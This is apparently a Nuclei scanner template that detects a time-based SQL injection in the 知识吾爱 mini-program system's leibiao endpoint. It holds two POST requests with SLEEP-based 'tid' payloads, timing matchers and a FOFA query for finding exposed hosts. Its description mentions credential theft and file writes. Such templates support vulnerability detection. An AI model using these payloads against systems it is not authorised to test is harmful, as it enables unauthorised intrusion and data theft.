id: zhishiwuai-leibiao-sql-XVE-2024-30663

info:
  name: "知识吾爱纯净版小程序系统leibiao组件SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: body="域名/skdjfdf"
      知识吾爱纯净版小程序系统leibiao组件存在SQL注入安全缺陷，攻击者可通过构造恶意SQL查询语句实现数据库敏感信息检索（包括但不限于管理员后台凭证、用户隐私数据）。在具备数据库写权限等高危条件下，攻击者可能通过注入点实现服务器端恶意文件写入，最终达成系统权限劫持。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488968&idx=1&sn=0da804e32c18aa1b89c92b5b7b38fcc1&chksm=c267a0fbf51029ed20d680465ceab5ced88984d7d9ae782bdf187343a8fc872b1411537e3f01&token=385896921&lang=zh_CN#rd
  tags: 知识吾爱纯净版小程序系统



http:
- raw:
  - |
    POST /app/zm/leibiao HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

    tid=(CASE WHEN (3711=3711) THEN SLEEP(4) ELSE 3711 END)
  - |
    POST /app/zm/leibiao HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

    tid=(CASE WHEN (3711=3711) THEN SLEEP(8) ELSE 3711 END)

  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and

